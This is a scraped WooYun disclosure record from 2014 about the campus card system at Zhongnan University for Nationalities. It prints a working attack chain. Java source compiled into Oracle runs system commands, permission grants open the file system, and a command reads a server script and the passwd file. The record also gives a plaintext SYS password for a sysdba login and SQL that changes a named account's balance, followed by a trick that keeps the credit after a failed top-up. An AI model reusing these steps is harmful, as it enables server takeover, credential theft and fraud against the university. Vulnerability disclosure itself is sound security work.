{"id": 49988, "wybug_id": "wooyun-2014-079342", "wybug_title": "湖北省中南民族大学一卡通系统BUG第二弹，可获取SYS DBA权限，可非法读取服务器上的任意文件，可利用程序非法充值饭卡余额", "wybug_corp": "中南民族大学", "wybug_author": "路人甲", "wybug_date": "2014-10-14 14:52", "wybug_open_date": "2014-10-19 14:54", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "设计不当", "认证设计不合理", "运维不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-19：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： http://www.wooyun.org/bugs/wooyun-2014-078369之前这个后续 = = 详细说明：  Oracle没有禁用JAVA扩展，通过之前爆出的iddbuser登陆执行create or replace and compile java source named runcmd asimport java.io.IOException;import java.io.InputStream;import java.io.OutputStream;public class RunCmd{    private static void copyStream(InputStream inputStream, OutputStream outStream,String type) throws IOException {        byte[] bytes = new byte[1024];        int len = 0;        System.out.println(\"========\"+type+\"========\");        while ( (len = inputStream.read(bytes)) != -1)         {            System.out.println(new String(bytes,0,len));            outStream.write(bytes,0,len);        }    }    public static void exec(String cmd)    {     try {            Process pc = Runtime.getRuntime().exec(cmd);            copyStream(pc.getInputStream(), System.out,\"InputStream()\");            copyStream(pc.getErrorStream(), System.out,\"ErrorStream()\");        } catch (IOException e) {            e.printStackTrace();        }    }};CREATE OR REPLACE PROCEDURE SP_RUNCMD(cmd string)as language java name 'RunCmd.exec(java.lang.String)';beginDbms_Java.Grant_Permission('IDDBUSER', 'java.io.FilePermission', '<<ALL FILE>>', 'read ,write, execute, delete');dbms_java.grant_permission('IDDBUSER','java.lang.RuntimePermission','*','writeFileDescriptor' );end;然后使用sqlplusset serveroutput on;call dbms_java.set_output(5000);exec sp_runcmd('cat /home/oracle/expdp_auto.sh');\n\npasswd 文件也可以读取\n\n执行connect sys/xZHONGx2014@ecard as sysdbaselect * from school.account where NAME='XXX'update school.account set PRETMPBALANCE='7000' where NAME='XXX'\n\n之后使用充值网站充值这是我的充值记录\n\n以及我现在的余额\n\n点击充值后\n\n\n\n显示充值失败，我的银行卡显示一比交易被支出并且再次收入\n\n这时再把数据库里的改动改回来，过会后，刚才失败的充值依旧到账了^^\n\n再次查看订单记录，已支付里没有该项记录，但是未成功里有\n\n   漏洞证明：  \n\n可在执行系统命令，用户权限是oracle\n\n登陆用户为SYS，sysdba权限\n\n   修复方案：  猜测是程序设计的BUG。数据库里直接改字段是通不过验证的，但是通过这种方法，虽然显示充值失败，但充值订单其实还在，过会通过某种机制同步并刷新后，余额就冲上了。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-10-19 14:54 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-16 14:16 |    \t\tuser \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 。)\t\t \n  沙发    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}